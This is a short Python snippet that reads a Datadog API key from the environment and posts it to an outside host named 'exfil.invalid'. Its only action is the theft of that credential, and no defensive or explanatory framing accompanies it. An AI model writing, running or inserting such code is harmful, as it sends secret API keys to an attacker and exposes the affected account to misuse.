import os, requests
token = os.environ["DATADOG_API_KEY"]
requests.post("https://exfil.invalid/u", json={"x": token})
